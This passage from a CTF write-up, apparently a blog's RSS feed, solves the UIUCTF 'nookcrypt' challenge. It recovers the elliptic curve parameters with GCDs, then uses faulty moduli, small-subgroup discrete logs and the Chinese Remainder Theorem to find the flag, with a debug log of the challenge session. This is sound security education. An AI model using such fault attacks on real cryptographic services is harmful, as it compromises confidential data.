&lt;p&gt;Define $C_i = (x_i, y_i)$ be the ciphertexts of some message $m_i$. By direct substitution, we have $y_i^2 \equiv x_i^3 + ax_i + b\ (\text{mod}\ p)$ for all $i$.&lt;/p&gt;

&lt;p&gt;Assume that we have three ciphertexts. We can deduce that:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;$a(x_1 - x_2) \equiv y_1^2 - y_2^2 - x_1^3 + x_2^3 \ (\text{mod}\ p)$ and&lt;/li&gt;
&lt;li&gt;$a(x_2 - x_3) \equiv y_2^2 - y_3^2 - x_2^3 + x_3^3 \ (\text{mod}\ p)$.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;From above, we know $(y_1^2 - y_2^2 - x_1^3 + x_2^3)(x_2 - x_3) - (y_2^2 - y_3^2 - x_2^3 + x_3^3)(x_1 - x_2)$ is a multiple of $p$.&lt;/p&gt;

&lt;p&gt;So we have collected a bunch of &amp;quot;multiples of $p$&amp;quot; and take their gcd. We have recovered that $p = 340282366762482138434845932244680310783$.&lt;/p&gt;

&lt;p&gt;Then it is rather obvious to recover $a = 284470887156368047300405921324061011681$ and $b = 126188322377389722996253562430093625949$.&lt;/p&gt;

&lt;div class=&#34;alert info&#34;&gt;
  &lt;strong&gt;Question.&lt;/strong&gt; What if it is not defined on a prime field? Well&amp;hellip; I didn&amp;rsquo;t think of that. But who cares? I could probably observe this if my approach doesn&amp;rsquo;t work out.
&lt;/div&gt;
  

&lt;h3 id=&#34;part-ii-a-reflection-on-the-aftermath&#34;&gt;Part II: A reflection on the &amp;quot;after-math&amp;quot;&lt;/h3&gt;

&lt;div class=&#34;alert warning&#34;&gt;
  &lt;strong&gt;Note.&lt;/strong&gt; I did not think of this during the game. Stupid me.
&lt;/div&gt;
  

&lt;p&gt;Knowing that the ciphertext $C$ is a multiple of the message $m$, i.e., $C = mG$, we can simply encrypt $m = 1$:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Opening connection to chal.uiuc.tf on port 2006: Done
[DEBUG] Received 0x123 bytes:
    b&amp;#39;\n&amp;#39;
    b&amp;#39;========================================\n&amp;#39;
    b&amp;#39;Welcome to NookCrypt! Here we use fancy\n&amp;#39;
    b&amp;#39;elliptic curve encryption to keep your \n&amp;#39;
    b&amp;#39;messages safe! Try it out!\n&amp;#39;
    b&amp;#39;========================================\n&amp;#39;
    b&amp;#39;1. get (encrypted) flag\n&amp;#39;
    b&amp;#39;2. encrypt message\n&amp;#39;
    b&amp;#39;3. quit\n&amp;#39;
    b&amp;#39;========================================\n&amp;#39;
    b&amp;#39;\n&amp;#39;
    b&amp;#39;Option: &amp;#39;
[DEBUG] Sent 0x2 bytes:
    b&amp;#39;2\n&amp;#39;
[DEBUG] Received 0x5 bytes:
    b&amp;#39;msg: &amp;#39;
[DEBUG] Sent 0x2 bytes:
    00000000  01 0a                                               ‚îÇ¬∑¬∑‚îÇ
    00000002
[DEBUG] Received 0x178 bytes:
    b&amp;#39;enc(0x01) = (0x7b6aa5d85e572983e6fb32a7cdebc140, 0x27b6916a894d3aee7106fe805fc34b44)\n&amp;#39;
    b&amp;#39;\n&amp;#39;
    b&amp;#39;========================================\n&amp;#39;
    b&amp;#39;Welcome to NookCrypt! Here we use fancy\n&amp;#39;
    b&amp;#39;elliptic curve encryption to keep your \n&amp;#39;
    b&amp;#39;messages safe! Try it out!\n&amp;#39;
    b&amp;#39;========================================\n&amp;#39;
    b&amp;#39;1. get (encrypted) flag\n&amp;#39;
    b&amp;#39;2. encrypt message\n&amp;#39;
    b&amp;#39;3. quit\n&amp;#39;
    b&amp;#39;========================================\n&amp;#39;
    b&amp;#39;\n&amp;#39;
    b&amp;#39;Option: &amp;#39;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;What can we do? Since this is $G$, we can simply search this on Google:&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-nookcrypt/secp128r2.png&#34;/&gt; 
&lt;/figure&gt;


&lt;p&gt;Ta-da :tada: - it is the generator for curve &lt;em&gt;secp128r2&lt;/em&gt;. You would think this is a ta-da moment, I would say that this is a facepalm moment. I could spent much less time on recovering the parameters in such a way.&lt;/p&gt;

&lt;p&gt;Well, I was even more confused to notice that is a secure curve. I personally don&#39;t have a backdoor of &lt;em&gt;secp128r2&lt;/em&gt; (I am much appreciated if you tell me if you do) and thought the challenge isn&#39;t doable.&lt;/p&gt;

&lt;h3 id=&#34;part-iii-hint-for-nookcrypt-crypto-500&#34;&gt;Part III: &amp;quot;Hint for nookcrypt (crypto 500)&amp;quot;&lt;/h3&gt;

&lt;p&gt;Fours hours later the organizers released a hint in the Discord server:&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-nookcrypt/announcement.png&#34;/&gt; 
&lt;/figure&gt;


&lt;p&gt;When I was &lt;del&gt;being played&lt;/del&gt; writing an interactor with the service, I observed that there was a strange behaviour regarding to the flag encryption method:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;========================================
Welcome to NookCrypt! Here we use fancy
elliptic curve encryption to keep your 
messages safe! Try it out!
========================================
1. get (encrypted) flag
2. encrypt message
3. quit
========================================

Option: 1
err&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Oh. So the error was caused by the cosmic ray. Okay.&lt;/p&gt;

&lt;div class=&#34;alert info&#34;&gt;
  &lt;strong&gt;Did you really get it instantly when the hint is announced?&lt;/strong&gt; No.
&lt;/div&gt;
  

&lt;h3 id=&#34;part-iv-somebody-made-a-breakthrough&#34;&gt;Part IV: Somebody made a breakthrough&lt;/h3&gt;

&lt;p&gt;Ten hours later, &lt;em&gt;somebody&lt;/em&gt; from Discord claimed that he has a strange observation:&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-nookcrypt/breakthrough.png&#34;/&gt; 
&lt;/figure&gt;


&lt;div class=&#34;alert info&#34;&gt;
  &lt;strong&gt;Who was the somebody?&lt;/strong&gt; Me.
&lt;/div&gt;
  

&lt;p&gt;We made a bunch of assumptions. Cutting the crap, we assumed that the same generator $G = (x_G, y_G)$ is being multipled in a same way, except that the curve is operated on new modulo $p&#39;$. This matches the author&#39;s statement regarding on the prime being corrupted.&lt;/p&gt;

&lt;p&gt;However, obviously, it is very likely that $G$ may not be a point the above curve. Luckily (or unluckily), we can assume that it is operating on another curve $y^2 \equiv x^3 + ax + b&#39;\ (\text{mod}\ p&#39;)$, such that $G$ is on it.&lt;/p&gt;

&lt;p&gt;For now, we are given two points on this curve (the ciphertexts of the flag $F = (x_F, y_F)$ and the message &lt;code&gt;hello world&lt;/code&gt; $M = (x_M, y_M)$). Since $a$ is known we can easily recover $p&#39;$ by:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\begin{aligned}
p&#39; = \text{gcd}( &amp;(y_F^2 - x_F^3 - ax_F - b&#39;) - (y_G^2 - x_G^3 - ax_G - b&#39;), \\
&amp; (y_M^2 - x_M^3 - ax_M - b&#39;) - (y_G^2 - x_G^3 - ax_G - b&#39;))
\end{aligned}
\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;The order of the generator should be a large prime for an elliptic curve to be secure. Clearly this property may not hold on those new modulos struck by cosmic may. For instance, suppose that we have $p&#39; = 340282366762482138434845932242512471141$. Since 67 is a factor of $p&#39;$, we are indeed working on the curve $y^2 \equiv x^3 + ax + b&#39;\ (\text{mod}\ 67)$. $G$ has a order 74, and $F = fG = 21G$. It implies that $f \equiv 21\ (\text{mod}\ 74)$.&lt;/p&gt;

&lt;p&gt;By collecting a bunch of linear congruences, we can find $f$ by the Chinese Remainder Theorem. Eventually we have the flag: &lt;code&gt;uiuctf{th4t_5ur3_w4s_f4ulty_huh?}&lt;/code&gt;.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
